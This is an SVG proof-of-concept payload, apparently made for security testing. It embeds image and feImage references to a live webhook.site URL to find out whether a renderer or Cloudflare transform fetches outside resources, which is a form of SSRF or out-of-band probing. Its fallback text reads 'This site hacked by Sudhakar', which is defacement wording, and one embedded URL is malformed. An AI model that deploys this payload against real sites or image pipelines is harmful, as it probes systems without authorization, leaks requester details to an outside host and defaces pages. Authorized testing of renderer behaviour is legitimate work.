<?xml version="1.0" encoding="utf-8"?>
<!-- PoC SVG — uses webhook.site endpoints for external-fetch detection.
     Replace the transform URL / victim domain when testing through Cloudflare.
     Authorized testing only. -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="900" height="700" viewBox="0 0 900 700" role="img" aria-label="Webhook test SVG">

  <rect width="100%" height="100%" fill="#fbfdff"/>

  <text x="450" y="36" text-anchor="middle" font-size="18" font-family="Segoe UI, Roboto, Arial" fill="#111">
    PoC: external-resource fetch tests → webhook.site (authorized testing)
  </text>

  <!-- 1) simple external <image> fetch to webhook -->
  <g transform="translate(40,70)">
    <text x="0" y="0" font-size="14" fill="#111">1) &lt;image href=...&gt; (should cause a browser GET to webhook URL)</text>
    <rect x="0" y="18" width="820" height="80" rx="8" fill="#fff" stroke="#e5e7eb"/>
    <text x="10" y="52" font-size="12" fill="#0b69a3">Image resource URL: https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c44/pixel.png</text>

    <!-- tiny image; browser will try to GET the URL when it renders the SVG -->
    <image href="https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c44/pixel.png" x="10" y="30" width="1" height="1" preserveAspectRatio="none" />
  </g>

  <!-- 2) filter + feImage (some renderers fetch feImage) -->
  <g transform="translate(40,180)">
    <text x="0" y="0" font-size="14" fill="#111">2) &lt;filter&gt; with &lt;feImage&gt; (edge/renderer may fetch resource)</text>
    <defs>
      <filter id="fWebhook" x="0" y="0" width="1" height="1" filterUnits="objectBoundingBox">
        <!-- feImage referencing webhook -->
        <feImage xlink:href="https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c44/filter-src.png"
                 href="https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c44/filter-src.png"
                 result="img"/>
        <feGaussianBlur in="img" stdDeviation="2" result="b"/>
        <feBlend in="SourceGraphic" in2="b" mode="normal"/>
      </filter>
    </defs>

    <rect x="0" y="18" width="260" height="120" rx="8" fill="#fff" stroke="#e5e7eb"/>
    <text x="140" y="52" text-anchor="middle" font-size="12" fill="#111827">feImage → /filter-src.png</text>

    <!-- element that uses the filter -->
    <rect x="20" y="70" width="220" height="48" rx="6" fill="#fde68a" filter="url(#fWebhook)"/>
    <text x="260" y="100" font-size="11" fill="#6b7280">If feImage is fetched, you'll see a GET in webhook.site</text>
  </g>

  <!-- 3) nested outer->inner example: outer references inner.svg on webhook domain -->
  <g transform="translate(40,330)">
    <text x="0" y="0" font-size="14" fill="#111">3) outer → &lt;image href="inner.svg"&gt; (inner.svg hosted on webhook.site — browser fetch indicates direct fetch)</text>

    <rect x="0" y="18" width="820" height="80" rx="8" fill="#fff" stroke="#e5e7eb"/>
    <text x="10" y="52" font-size="12" fill="#0b69a3">Inner SVG URL: https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c44/inner.svg</text>

    <!-- Outer references inner.svg (if browser fetches inner.svg directly you'll see a GET) -->
    <image href="https://webhook.site/df96e004-51ca-45ec-9cfa-cfa50c3f7c7c44/inner.svg" x="10" y="30" width="1" height="1" preserveAspectRatio="none"/>
    <!-- NOTE: above URL intentionally malformed? If you want the exact path use /inner.svg as shown in text line above. -->
  </g>

  <!-- 4) visual fallback -->
  <g transform="translate(40,440)">
    <text x="0" y="0" font-size="14" fill="#111">4) Visual fallback (always renders)</text>
    <rect x="0" y="18" width="820" height="160" rx="8" fill="#fff" stroke="#e5e7eb"/>
    <text x="410" y="70" text-anchor="middle" font-size="18" fill="#b71c1c">Visual fallback: This site hacked by Sudhakar</text>
    <text x="410" y="110" text-anchor="middle" font-size="12" fill="#6b7280">Use screenshots if external fetches are blocked/sanitized</text>
  </g>

  <text x="450" y="690" text-anchor="middle" font-size="10" fill="#6b7280">
    After testing, check https://webhook.site/#!/view/df96e004-51ca-45ec-9cfa-cfa50c3f7c44 for incoming requests.
  </text>
</svg>
